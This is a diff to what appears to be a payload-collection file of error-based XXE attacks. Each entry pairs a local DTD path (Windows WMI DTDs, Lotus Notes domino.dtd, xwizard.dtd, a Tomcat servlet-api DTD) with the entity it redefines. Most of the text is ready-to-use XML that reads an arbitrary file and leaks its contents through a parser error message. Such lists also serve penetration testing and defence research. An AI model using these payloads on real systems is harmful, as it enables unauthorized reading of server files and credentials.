@@ -1,6 +1,6 @@
 # XXE payloads for specific DTDs
 
-**DTD File:** `C:\Windows\System32\wbem\xml\cim20.dtd`
+**DTD File:** `/C:\Windows\System32\wbem\xml\cim20.dtd`
 
 **Injectable entity:** `%CIMName`
 
@@ -15,6 +15,75 @@
         &#x25;eval;
         &#x25;error;
         <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/C:\Windows\System32\wbem\xml\wmi20.dtd`
+
+**Injectable entity:** `%CIMName`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\wmi20.dtd">
+
+    <!ENTITY % CIMName '>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ELEMENT aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/C:\Program Files (x86)\Lotus\Notes\domino.dtd`
+
+**Injectable entity:** `%boolean`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Program Files (x86)\Lotus\Notes\domino.dtd">
+
+    <!ENTITY % boolean '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
+
+    %local_dtd;
+]>
+<message></message>
+```
+
+ --- 
+
+**DTD File:** `/C:\Windows\System32\xwizard.dtd`
+
+**Injectable entity:** `%onerrortypes`
+
+**XXE Payload:**
+```
+<!DOCTYPE message [
+    <!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\xwizard.dtd">
+
+    <!ENTITY % onerrortypes '(aa) #IMPLIED>
+        <!ENTITY &#x25; file SYSTEM "file:///YOUR_FILE">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        <!ATTLIST attxx aa "bb"'>
 
     %local_dtd;
 ]>
@@ -511,7 +580,7 @@
 
 **DTD File:** `/usr/local/tomcat/lib/servlet-api.jar!/javax/servlet/resources/XMLSchema.dtd`
 
-**Injectable entity:** `xs-datatypes`
+**Injectable entity:** `%xs-datatypes`
 
 **XXE Payload:**
 ```
